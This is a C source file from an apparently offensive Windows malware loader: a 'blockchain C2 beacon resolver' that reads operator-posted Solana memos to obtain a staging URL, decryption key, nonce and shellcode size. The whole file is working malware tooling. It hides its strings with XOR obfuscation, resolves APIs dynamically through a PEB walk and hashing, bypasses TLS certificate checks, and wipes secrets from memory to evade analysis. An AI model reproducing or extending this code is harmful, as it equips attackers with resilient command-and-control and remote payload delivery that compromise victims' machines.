// =============================================
// Solana.c - Blockchain C2 Beacon Resolver
//
// Decodes the SOL wallet address embedded in Payload.h (XOR-obfuscated),
// queries the Solana JSON-RPC API for the wallet's recent transactions,
// finds the latest SPL Memo posted BY this wallet, and returns:
//   - Staging URL  (heap-allocated, caller must HeapFree)
//   - Chaskey key  (KEY_SIZE bytes, written into caller's buffer)
//   - Chaskey nonce (12 bytes, written into caller's buffer)
//
// Memo format (written by Encrypt.py, posted on-chain by the operator):
//   <url>|<32-hex-key>|<24-hex-nonce>|<decimal-size>|<0-or-1>
//
// RPC flow:
//   POST getSignaturesForAddress(wallet, limit=10)
//     -> each entry includes a "memo" field (SPL Memo text, no extra call needed)
//     -> scan entries newest-first for our 4-pipe format
//   POST getTransaction(signature, encoding=json)  [only for matching entries]
//     -> verify accountKeys[0] == wallet (fee payer = us, not a third party)
//     -> parse url|key|nonce|size|flag from the already-extracted memo
//
// Security: reading the "memo" field directly avoids calling getTransaction for
// every entry (cheap scan). Fee payer verification prevents forged memos sent
// TO the wallet from poisoning the beacon. An attacker spamming fake memos must
// pay real SOL per transaction and still cannot pass the fee payer check.
// =============================================

#include "Common.h"

// ---- WinINet typedefs (resolved locally; wininet already preloaded) ----
typedef PVOID (WINAPI* fnSolInetOpenA)     (LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
typedef PVOID (WINAPI* fnSolInetConnectA)  (PVOID, LPCSTR, WORD, LPCSTR, LPCSTR, DWORD, DWORD, ULONG_PTR);
typedef PVOID (WINAPI* fnSolHttpOpenReqA)  (PVOID, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR*, DWORD, ULONG_PTR);
typedef BOOL  (WINAPI* fnSolHttpSendReqA)  (PVOID, LPCSTR, DWORD, LPVOID, DWORD);
typedef BOOL  (WINAPI* fnSolInetReadFile)  (PVOID, LPVOID, DWORD, LPDWORD);
typedef BOOL  (WINAPI* fnSolInetCloseHnd)  (PVOID);
typedef BOOL  (WINAPI* fnSolInetSetOptA)   (PVOID, DWORD, LPVOID, DWORD);
typedef BOOL  (WINAPI* fnSolInetQueryOptA) (PVOID, DWORD, LPVOID, LPDWORD);

#define SOL_CHUNK_SIZE          8192
#define SOL_INET_SVC_HTTP       3
#define SOL_INET_FLAG_SECURE    0x00800000
#define SOL_INET_FLAG_RELOAD    0x80000000
#define SOL_INET_FLAG_NO_CACHE  0x04000000
#define SOL_INET_FLAG_KEEP_CON  0x00400000
#define SOL_INET_FLAG_IGN_CN    0x00001000
#define SOL_INET_FLAG_IGN_DT    0x00002000
#define SOL_INET_OPT_SEC_FLAGS  31
#define SOL_SEC_IGN_CA          0x00000100
#define SOL_SEC_IGN_CN          0x00001000
#define SOL_SEC_IGN_DATE        0x00002000
#define SOL_SEC_IGN_REVOC       0x00000080

// -----------------------------------------------
// CatStr: append null-terminated s into buf at pos.
// No bounds check — caller must ensure capacity.
// Returns new write position.
// -----------------------------------------------
static DWORD CatStr(PCHAR buf, DWORD pos, LPCSTR s) {
    while (*s) buf[pos++] = *s++;
    return pos;
}

// -----------------------------------------------
// HexNibble: single hex char -> 0-15, 0xFF on error.
// -----------------------------------------------
static BYTE HexNibble(CHAR c) {
    if (c >= '0' && c <= '9') return (BYTE)(c - '0');
    if (c >= 'a' && c <= 'f') return (BYTE)(c - 'a' + 10);
    if (c >= 'A' && c <= 'F') return (BYTE)(c - 'A' + 10);
    return 0xFF;
}

// -----------------------------------------------
// HexDecode: decode hexLen hex chars into pOut.
// hexLen must be even. Returns TRUE on success.
// -----------------------------------------------
static BOOL HexDecode(const CHAR* pHex, DWORD hexLen, PBYTE pOut) {
    if (hexLen & 1) return FALSE;
    for (DWORD i = 0; i < hexLen; i += 2) {
        BYTE hi = HexNibble(pHex[i]);
        BYTE lo = HexNibble(pHex[i + 1]);
        if (hi == 0xFF || lo == 0xFF) return FALSE;
        pOut[i >> 1] = (BYTE)((hi << 4) | lo);
    }
    return TRUE;
}

// -----------------------------------------------
// FindBytes: find first occurrence of needle in hs.
// Both are byte buffers — not null-terminated.
// Returns pointer into hs, or NULL.
// -----------------------------------------------
static const CHAR* FindBytes(
    const CHAR* hs, DWORD hsLen,
    const CHAR* needle, DWORD needleLen
) {
    if (!needleLen || needleLen > hsLen) return NULL;
    DWORD limit = hsLen - needleLen;
    for (DWORD i = 0; i <= limit; i++) {
        BOOL ok = TRUE;
        for (DWORD j = 0; j < needleLen; j++) {
            if (hs[i + j] != needle[j]) { ok = FALSE; break; }
        }
        if (ok) return hs + i;
    }
    return NULL;
}

// -----------------------------------------------
// SolReadResponse: drain an open WinINet request
// handle into a heap buffer. Caller must HeapFree.
// Returns NULL on failure or empty response.
// -----------------------------------------------
static PBYTE SolReadResponse(
    fnSolInetReadFile pRead,
    PVOID             hReq,
    PDWORD            pdwSize
) {
    SIZE_T cap = SOL_CHUNK_SIZE * 32;
    PBYTE  buf = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cap);
    if (!buf) return NULL;

    SIZE_T total = 0;
    DWORD  nRead = 0;
    while (1) {
        if (total + SOL_CHUNK_SIZE > cap) {
            cap *= 2;
            PBYTE nb = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cap);
            if (!nb) { HeapFree(GetProcessHeap(), 0, buf); return NULL; }
            MemCopy(nb, buf, total);
            HeapFree(GetProcessHeap(), 0, buf);
            buf = nb;
        }
        if (!pRead(hReq, buf + total, SOL_CHUNK_SIZE, &nRead) || nRead == 0)
            break;
        total += nRead;
    }

    if (total == 0) { HeapFree(GetProcessHeap(), 0, buf); return NULL; }
    *pdwSize = (DWORD)total;
    return buf;
}

// -----------------------------------------------
// SolRpcPost: open an HTTPS connection to szHost,
// POST szBody (JSON-RPC), return response heap buf.
// Returns NULL on failure. Caller must HeapFree.
// -----------------------------------------------
static PBYTE SolRpcPost(
    fnSolInetOpenA     pOpen,
    fnSolInetConnectA  pConnect,
    fnSolHttpOpenReqA  pHttpOpen,
    fnSolHttpSendReqA  pHttpSend,
    fnSolInetReadFile  pRead,
    fnSolInetCloseHnd  pClose,
    fnSolInetSetOptA   pSetOpt,
    fnSolInetQueryOptA pQueryOpt,
    LPCSTR szHost,
    LPCSTR szBody,
    PDWORD pdwRespLen
) {
    BYTE xUA[] = XSTR_USER_AGENT; DEOBF(xUA);
    PVOID hNet = pOpen((LPCSTR)xUA, 0, NULL, NULL, 0);
    if (!hNet) return NULL;

    PVOID hConn = pConnect(hNet, szHost, 443, NULL, NULL, SOL_INET_SVC_HTTP, 0, 0);
    if (!hConn) { pClose(hNet); return NULL; }

    DWORD dwFlags = SOL_INET_FLAG_SECURE  | SOL_INET_FLAG_RELOAD  |
                    SOL_INET_FLAG_NO_CACHE | SOL_INET_FLAG_KEEP_CON |
                    SOL_INET_FLAG_IGN_CN   | SOL_INET_FLAG_IGN_DT;

    BYTE xPost[] = XSTR_HTTP_POST; DEOBF(xPost);
    PVOID hReq = pHttpOpen(hConn, (LPCSTR)xPost, "/", NULL, NULL, NULL, dwFlags, 0);
    if (!hReq) { pClose(hConn); pClose(hNet); return NULL; }

    // Build "Content-Type: application/json\r\n" for the header arg
    BYTE  xCT[] = XSTR_JSON_CONTENT_TYPE; DEOBF(xCT);
    CHAR  szHeader[48] = { 0 };
    DWORD hLen = 0;
    hLen = CatStr(szHeader, hLen, (LPCSTR)xCT);
    szHeader[hLen++] = '\r';
    szHeader[hLen++] = '\n';
    szHeader[hLen]   = '\0';
    MemSet(xCT, 0, sizeof(xCT));

    DWORD dwBodyLen = (DWORD)StrLenA(szBody);
    BOOL  bSent = pHttpSend(hReq, szHeader, (DWORD)-1, (PVOID)szBody, dwBodyLen);

    // SSL cert bypass (handles custom CA / self-signed on private RPC nodes)
    if (!bSent && pSetOpt) {
        DWORD secFlags = 0, secLen = sizeof(secFlags);
        if (pQueryOpt) pQueryOpt(hReq, SOL_INET_OPT_SEC_FLAGS, &secFlags, &secLen);
        secFlags |= SOL_SEC_IGN_CA | SOL_SEC_IGN_CN | SOL_SEC_IGN_DATE | SOL_SEC_IGN_REVOC;
        pSetOpt(hReq, SOL_INET_OPT_SEC_FLAGS, &secFlags, sizeof(secFlags));
        bSent = pHttpSend(hReq, szHeader, (DWORD)-1, (PVOID)szBody, dwBodyLen);
    }
    MemSet(szHeader, 0, sizeof(szHeader));

    PBYTE pResp = NULL;
    if (bSent)
        pResp = SolReadResponse(pRead, hReq, pdwRespLen);

    pClose(hReq);
    pClose(hConn);
    pClose(hNet);
    return pResp;
}

// -----------------------------------------------
// ParseDecimal: read decimal digits from s up to
// maxLen chars, return the parsed DWORD value.
// Stops at first non-digit or maxLen.
// -----------------------------------------------
static DWORD ParseDecimal(const CHAR* s, DWORD maxLen) {
    DWORD val = 0;
    for (DWORD i = 0; i < maxLen && s[i] >= '0' && s[i] <= '9'; i++)
        val = val * 10 + (DWORD)(s[i] - '0');
    return val;
}

// -----------------------------------------------
// FetchSolMemo — public entry point
//
// 1. Decode beacon wallet + RPC host from Payload.h
// 2. POST getSignaturesForAddress(limit=10) — each entry includes
//    a "memo" field; scan newest-first for our 4-pipe format
// 3. POST getTransaction(sig) for each matching entry — verify
//    accountKeys[0] == wallet (fee payer check; prevents forged memos
//    sent TO the wallet or inbox-spam DDoS)
// 4. Parse the verified memo:
//      <url>|<32-hex-key>|<24-hex-nonce>|<decimal-size>|<0-or-1>
//
// Retries up to NET_RETRY_COUNT times (Common.h) with NET_RETRY_DELAY_MS
// between attempts, so the loader survives early-boot network delays.
//
// Returns TRUE and fills:
//   *ppUrl           heap-allocated staging URL (caller HeapFree + wipe)
//   pKey             16-byte Chaskey key (caller wipes after use)
//   pNonce           12-byte Chaskey nonce (caller wipes)
//   *pdwPayloadSize  original (uncompressed) shellcode size in bytes
//   *pbCompressed    TRUE if payload was LZNT1-compressed before encryption
//
// Including size + compression in the memo means the binary has NO
// payload-specific compile-time data — any future payload works without
// a rebuild. Only the wallet address and RPC host are baked in.
// -----------------------------------------------
BOOL FetchSolMemo(
    IN  PAPI_HASHING pApi,
    OUT PCHAR*       ppUrl,
    OUT PBYTE        pKey,
    OUT PBYTE        pNonce,
    OUT PDWORD       pdwPayloadSize,
    OUT PBOOL        pbCompressed
) {
    if (!ppUrl || !pKey || !pNonce || !pdwPayloadSize || !pbCompressed) return FALSE;
    *ppUrl          = NULL;
    *pdwPayloadSize = 0;
    *pbCompressed   = FALSE;

    // ---- Resolve wininet (already preloaded in main.c) ----
    BYTE xWininet[] = XSTR_WININET_DLL; DEOBF(xWininet);
    HMODULE hWinInet = pApi->pLoadLibraryA((LPCSTR)xWininet);
    if (!hWinInet) return FALSE;

    BYTE xA1[] = XSTR_INTERNET_OPEN_A;          DEOBF(xA1);
    BYTE xA2[] = XSTR_INTERNET_CONNECT_A;        DEOBF(xA2);
    BYTE xA3[] = XSTR_HTTP_OPEN_REQUEST_A;       DEOBF(xA3);
    BYTE xA4[] = XSTR_HTTP_SEND_REQUEST_A;       DEOBF(xA4);
    BYTE xA5[] = XSTR_INTERNET_READ_FILE;        DEOBF(xA5);
    BYTE xA6[] = XSTR_INTERNET_CLOSE_HANDLE;     DEOBF(xA6);
    BYTE xA7[] = XSTR_INTERNET_SET_OPTION_A;     DEOBF(xA7);
    BYTE xA8[] = XSTR_INTERNET_QUERY_OPTION_A;   DEOBF(xA8);

    fnSolInetOpenA     pOpen     = (fnSolInetOpenA)    pApi->pGetProcAddress(hWinInet, (LPCSTR)xA1);
    fnSolInetConnectA  pConnect  = (fnSolInetConnectA) pApi->pGetProcAddress(hWinInet, (LPCSTR)xA2);
    fnSolHttpOpenReqA  pHttpOpen = (fnSolHttpOpenReqA) pApi->pGetProcAddress(hWinInet, (LPCSTR)xA3);
    fnSolHttpSendReqA  pHttpSend = (fnSolHttpSendReqA) pApi->pGetProcAddress(hWinInet, (LPCSTR)xA4);
    fnSolInetReadFile  pRead     = (fnSolInetReadFile)  pApi->pGetProcAddress(hWinInet, (LPCSTR)xA5);
    fnSolInetCloseHnd  pClose    = (fnSolInetCloseHnd)  pApi->pGetProcAddress(hWinInet, (LPCSTR)xA6);
    fnSolInetSetOptA   pSetOpt   = (fnSolInetSetOptA)   pApi->pGetProcAddress(hWinInet, (LPCSTR)xA7);
    fnSolInetQueryOptA pQueryOpt = (fnSolInetQueryOptA) pApi->pGetProcAddress(hWinInet, (LPCSTR)xA8);

    if (!pOpen || !pConnect || !pHttpOpen || !pHttpSend || !pRead || !pClose)
        return FALSE;

    // ---- Decode SOL wallet address ----
    // INIT_SOL_WALLET is a XOR-obfuscated byte array; SOL_WALLET_XOR_KEY
    // is the single-byte key; SOL_WALLET_LEN includes the null terminator.
    BYTE xWallet[] = INIT_SOL_WALLET;
    CHAR szWallet[48] = { 0 };
    {
        DWORD wLen = SOL_WALLET_LEN - 1; // strip null terminator
        for (DWORD i = 0; i < wLen && i < 47; i++)
            szWallet[i] = (CHAR)(xWallet[i] ^ SOL_WALLET_XOR_KEY);
        szWallet[wLen < 47 ? wLen : 47] = '\0';
    }
    MemSet(xWallet, 0, sizeof(xWallet));

    // ---- Decode RPC host ----
    BYTE xRpc[] = INIT_SOL_RPC_HOST;
    CHAR szRpcHost[64] = { 0 };
    {
        DWORD rLen = SOL_RPC_HOST_LEN - 1;
        for (DWORD i = 0; i < rLen && i < 63; i++)
            szRpcHost[i] = (CHAR)(xRpc[i] ^ SOL_RPC_XOR_KEY);
        szRpcHost[rLen < 63 ? rLen : 63] = '\0';
    }
    MemSet(xRpc, 0, sizeof(xRpc));

    // ---- Resolve Sleep for retry delays (kernel32, PEB walk) ----
    typedef VOID (WINAPI* fnSleepFn)(DWORD);
    fnSleepFn pSleep = NULL;
    {
        PVOID hK32 = FindLoadedModuleW(L"KERNEL32.DLL");
        if (hK32) pSleep = (fnSleepFn)FetchExportAddress(hK32, Sleep_JOAAT);
    }

    LOG("[*] Solana: resolving beacon...");

    // ================================================================
    // Working buffers (declared outside retry loop — zeroed each pass)
    // ================================================================
    CHAR szBody1[256] = { 0 };
    CHAR szBody2[256] = { 0 };
    CHAR szSig[96]    = { 0 };
    CHAR szMemo[512]  = { 0 };
    BOOL bFound       = FALSE;

    // Static search keys live in .rdata, not on the stack.
    static const CHAR SZ_MEMO_KEY[] = "\"memo\":\"";      //  8 bytes
    static const CHAR SZ_SIG_KEY[]  = "\"signature\":\""; // 13 bytes
    static const CHAR SZ_ACCT_KEY[] = "\"accountKeys\"";  // 13 bytes

    // ================================================================
    // Outer retry loop
    // Retries on: RPC network failure OR no valid memo in the window.
    // Up to NET_RETRY_COUNT retries with NET_RETRY_DELAY_MS between them.
    // ================================================================
    for (DWORD iRetry = 0; iRetry <= NET_RETRY_COUNT && !bFound; iRetry++) {

        if (iRetry > 0) {
            LOG("[*] Solana: network retry...");
            if (pSleep) pSleep(NET_RETRY_DELAY_MS);
        }

        // ================================================================
        // Step 1: getSignaturesForAddress(limit:10)
        //
        // Each result entry carries a "memo" field — the SPL Memo program
        // text — so we can scan for our pattern without calling getTransaction
        // on every entry. limit:10 is enough to find the latest operator memo
        // while bounding RPC cost even under inbox-spam attacks.
        // ================================================================
        MemSet(szBody1, 0, sizeof(szBody1));
        {
            DWORD n = 0;
            n = CatStr(szBody1, n, "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"getSignaturesForAddress\",\"params\":[\"");
            n = CatStr(szBody1, n, szWallet);
            n = CatStr(szBody1, n, "\",{\"limit\":10}]}");
            szBody1[n] = '\0';
        }

        DWORD dwResp1Len = 0;
        PBYTE pResp1 = SolRpcPost(
            pOpen, pConnect, pHttpOpen, pHttpSend, pRead, pClose, pSetOpt, pQueryOpt,
            szRpcHost, szBody1, &dwResp1Len
        );
        MemSet(szBody1, 0, sizeof(szBody1));

        if (!pResp1) {
            LOG("[!] Solana: getSignaturesForAddress failed");
            continue; // retry
        }

        // ================================================================
        // Step 2: Scan entries for a verified memo
        //
        // getSignaturesForAddress returns entries newest-first. For each:
        //   a) Find "memo":"..." — transactions without a memo have
        //      "memo":null so the opening-quote search naturally skips them.
        //   b) Count pipe chars: our format needs exactly 4.
        //   c) Find the "signature":"..." for that entry (within 300 bytes
        //      after the memo value — field order in Solana RPC responses
        //      is blockTime, confirmationStatus, err, memo, signature, slot).
        //   d) Call getTransaction(sig) once to read accountKeys[0].
        //      If accountKeys[0] == szWallet the fee payer is us; accept.
        //      Otherwise skip — foreign tx or forged memo.
        //
        // Normal case: 1 getSignaturesForAddress + 1 getTransaction (2 calls).
        // Under attack: at most 10 getTransaction calls, then retry outer loop.
        // ================================================================
        const CHAR* pCursor   = (const CHAR*)pResp1;
        DWORD       remaining = dwResp1Len;

        for (INT attempt = 0; attempt < 10 && !bFound; attempt++) {

            // Find next "memo":" in remaining buffer
            const CHAR* pMemoKey = FindBytes(pCursor, remaining, SZ_MEMO_KEY, 8);
            if (!pMemoKey) break;

            const CHAR* pMemoVal = pMemoKey + 8;
            DWORD       consumed = (DWORD)(pMemoVal - pCursor); // bytes up to value start

            // Extract memo value — stops at closing " or newline
            DWORD mMax = (remaining > consumed) ? (remaining - consumed) : 0;
            if (mMax > 511) mMax = 511;
            DWORD mLen = 0;
            while (mLen < mMax && pMemoVal[mLen] != '"' && pMemoVal[mLen] != '\n')
                mLen++;

            // Check for 4-pipe format: url|key|nonce|size|flag
            INT pipes = 0;
            for (DWORD k = 0; k < mLen; k++)
                if (pMemoVal[k] == '|') pipes++;

            if (pipes >= 4 && mLen > 0) {
                MemCopy(szMemo, pMemoVal, mLen);
                szMemo[mLen] = '\0';

                // Find "signature":" for this entry (within next 300 bytes).
                // memo comes before signature in each result object.
                const CHAR* pAfterMemo = pMemoVal + mLen + 1; // past closing "
                DWORD afterOff   = (DWORD)(pAfterMemo - pCursor);
                DWORD sigSrchLen = (remaining > afterOff) ? (remaining - afterOff) : 0;
                if (sigSrchLen > 300) sigSrchLen = 300;

                const CHAR* pSigKey = FindBytes(pAfterMemo, sigSrchLen, SZ_SIG_KEY, 13);
                if (pSigKey) {
                    const CHAR* pSigVal = pSigKey + 13;
                    DWORD sigOff = (DWORD)(pSigVal - pCursor);
                    DWORD sigRem = (remaining > sigOff) ? (remaining - sigOff) : 0;
                    if (sigRem > 95) sigRem = 95;
                    DWORD sigLen = 0;
                    while (sigLen < sigRem && pSigVal[sigLen] != '"') sigLen++;

                    if (sigLen >= 50 && sigLen <= 95) {
                        MemCopy(szSig, pSigVal, sigLen);
                        szSig[sigLen] = '\0';

                        // --- getTransaction: verify accountKeys[0] == szWallet ---
                        {
                            DWORD n = 0;
                            n = CatStr(szBody2, n, "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"getTransaction\",\"params\":[\"");
                            n = CatStr(szBody2, n, szSig);
                            n = CatStr(szBody2, n, "\",{\"encoding\":\"json\",\"maxSupportedTransactionVersion\":0}]}");
                            szBody2[n] = '\0';
                        }

                        DWORD dwTxLen = 0;
                        PBYTE pTx = SolRpcPost(
                            pOpen, pConnect, pHttpOpen, pHttpSend, pRead, pClose, pSetOpt, pQueryOpt,
                            szRpcHost, szBody2, &dwTxLen
                        );
                        MemSet(szBody2, 0, sizeof(szBody2));

                        if (pTx) {
                            // Locate "accountKeys" key, then scan to '[' then '"'
                            // (handles both minified and pretty-printed JSON)
                            const CHAR* pAK = FindBytes((const CHAR*)pTx, dwTxLen, SZ_ACCT_KEY, 13);
                            if (pAK) {
                                const CHAR* pScan = pAK + 13;
                                DWORD scanRem = dwTxLen - (DWORD)(pScan - (const CHAR*)pTx);

                                // Skip to '['
                                DWORD bi = 0;
                                while (bi < scanRem && pScan[bi] != '[') bi++;

                                if (bi < scanRem) {
                                    // Skip to first '"' (opening of first key)
                                    const CHAR* pArr = pScan + bi + 1;
                                    DWORD arrRem = dwTxLen - (DWORD)(pArr - (const CHAR*)pTx);
                                    DWORD qi = 0;
                                    while (qi < arrRem && pArr[qi] != '"') qi++;

                                    if (qi < arrRem) {
                                        const CHAR* pAKVal = pArr + qi + 1;
                                        DWORD akOff = (DWORD)(pAKVal - (const CHAR*)pTx);
                                        DWORD akRem = (dwTxLen > akOff) ? (dwTxLen - akOff) : 0;
                                        if (akRem > 47) akRem = 47;
                                        DWORD akLen = 0;
                                        while (akLen < akRem && pAKVal[akLen] != '"') akLen++;

                                        // Byte-by-byte compare to szWallet
                                        DWORD walLen = (DWORD)StrLenA(szWallet);
                                        if (akLen == walLen && akLen > 0) {
                                            BOOL same = TRUE;
                                            for (DWORD k = 0; k < akLen && same; k++)
                                                if (pAKVal[k] != szWallet[k]) same = FALSE;
                                            if (same) {
                                                LOG("[+] Solana: fee payer verified");
                                                bFound = TRUE;
                                            }
                                        }
                                    }
                                }
                            }
                            HeapFree(GetProcessHeap(), 0, pTx);
                        }
                    }
                }
            }

            // Clear candidates if this entry didn't pan out
            if (!bFound) {
                MemSet(szMemo, 0, sizeof(szMemo));
                MemSet(szSig,  0, sizeof(szSig));
            }

            // Advance cursor past this memo value (consumed + value + closing ")
            DWORD skip = consumed + mLen + 1;
            if (skip >= remaining) break;
            pCursor   += skip;
            remaining -= skip;
        }

        HeapFree(GetProcessHeap(), 0, pResp1);
        pResp1 = NULL;

        if (!bFound) {
            LOG("[!] Solana: no verified memo found, will retry");
            MemSet(szMemo, 0, sizeof(szMemo));
            MemSet(szSig,  0, sizeof(szSig));
        }

    } // end outer retry loop

    // Wipe secrets — no longer needed
    MemSet(szWallet,  0, sizeof(szWallet));
    MemSet(szRpcHost, 0, sizeof(szRpcHost));
    MemSet(szSig,     0, sizeof(szSig));

    if (!bFound) {
        LOG("[!] Solana: beacon resolution failed after all retries");
        MemSet(szMemo, 0, sizeof(szMemo));
        return FALSE;
    }

    LOG("[+] Solana: memo extracted and fee payer verified");

    // ================================================================
    // Step 3: Parse memo
    //   <url> | <32-hex-key> | <24-hex-nonce> | <decimal-size> | <0-or-1>
    //
    //   url              : variable length, ends at pipe1
    //   hex key          : exactly 32 hex chars  (16 bytes)
    //   hex nonce        : exactly 24 hex chars  (12 bytes)
    //   decimal-size     : original (uncompressed) payload size in bytes
    //   compression-flag : '0' or '1'
    //
    // Having size + compression in the memo means the same compiled binary
    // works with any future payload of any size, compressed or not.
    // ================================================================
    DWORD memoLen = (DWORD)StrLenA(szMemo);

    // Solana RPC prepends "[N] " to the memo field in getSignaturesForAddress
    // responses (N = byte length of the memo text). Strip it before parsing so
    // the URL field doesn't start with "[141] " or similar garbage.
    // Pattern: '[' <digits> ']' ' '
    if (memoLen > 3 && szMemo[0] == '[') {
        DWORD mi = 1;
        while (mi < memoLen && szMemo[mi] >= '0' && szMemo[mi] <= '9') mi++;
        if (mi > 1 && mi + 1 < memoLen && szMemo[mi] == ']' && szMemo[mi + 1] == ' ') {
            DWORD skip = mi + 2;  // past "] "
            DWORD newLen = (memoLen > skip) ? (memoLen - skip) : 0;
            MemCopy(szMemo, szMemo + skip, newLen);
            szMemo[newLen] = '\0';
            memoLen = newLen;
        }
    }

    // Helper: find the Nth '|' starting from offset, return its index or memoLen.
    #define FIND_PIPE(startIdx, outIdx) \
        do { (outIdx) = memoLen; \
             for (DWORD _fi = (startIdx); _fi < memoLen; _fi++) { \
                 if (szMemo[_fi] == '|') { (outIdx) = _fi; break; } } \
        } while (0)

    DWORD pipe1, pipe2, pipe3, pipe4;
    FIND_PIPE(0,          pipe1);
    FIND_PIPE(pipe1 + 1,  pipe2);
    FIND_PIPE(pipe2 + 1,  pipe3);
    FIND_PIPE(pipe3 + 1,  pipe4);

    #undef FIND_PIPE

    // All four delimiters must be present and URL must be non-empty
    if (pipe1 == 0 || pipe1 == memoLen ||
        pipe2 == memoLen || pipe3 == memoLen || pipe4 == memoLen) {
        LOG("[!] Solana: memo: missing delimiter(s)");
        MemSet(szMemo, 0, sizeof(szMemo));
        return FALSE;
    }

    DWORD urlLen       = pipe1;
    DWORD hexKeyLen    = pipe2 - (pipe1 + 1);   // must be 32
    DWORD hexNonceLen  = pipe3 - (pipe2 + 1);   // must be 24
    DWORD sizeFieldLen = pipe4 - (pipe3 + 1);
    DWORD compFieldLen = memoLen - (pipe4 + 1);

    if (urlLen == 0 || hexKeyLen != 32 || hexNonceLen != 24 ||
        sizeFieldLen == 0 || compFieldLen == 0) {
        LOG("[!] Solana: memo: field length invalid");
        MemSet(szMemo, 0, sizeof(szMemo));
        return FALSE;
    }

    // Decode 16-byte Chaskey key and 12-byte nonce
    if (!HexDecode(szMemo + pipe1 + 1, 32, pKey) ||
        !HexDecode(szMemo + pipe2 + 1, 24, pNonce)) {
        LOG("[!] Solana: memo: hex decode failed");
        MemSet(szMemo, 0, sizeof(szMemo));
        MemSet(pKey,   0, KEY_SIZE);
        MemSet(pNonce, 0, 12);
        return FALSE;
    }

    // Parse uncompressed payload size (decimal)
    DWORD payloadSz = ParseDecimal(szMemo + pipe3 + 1, sizeFieldLen);
    if (payloadSz == 0) {
        LOG("[!] Solana: memo: payload size is zero");
        MemSet(szMemo, 0, sizeof(szMemo));
        MemSet(pKey,   0, KEY_SIZE);
        MemSet(pNonce, 0, 12);
        return FALSE;
    }

    // Parse compression flag ('1' = compressed, anything else = not)
    BOOL bComp = (szMemo[pipe4 + 1] == '1');

    // Copy URL into heap buffer (null-terminated, caller frees + wipes)
    PCHAR pUrl = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, urlLen + 1);
    if (!pUrl) {
        MemSet(szMemo, 0, sizeof(szMemo));
        MemSet(pKey,   0, KEY_SIZE);
        MemSet(pNonce, 0, 12);
        return FALSE;
    }
    MemCopy(pUrl, szMemo, urlLen);
    pUrl[urlLen] = '\0';

    // Wipe memo — contains plaintext URL + key hex
    MemSet(szMemo, 0, sizeof(szMemo));

    *ppUrl          = pUrl;
    *pdwPayloadSize = payloadSz;
    *pbCompressed   = bComp;

    LOG_STR("[+] Solana: resolved URL = ", pUrl);
    LOG("[+] Solana: beacon resolved");
    return TRUE;
}
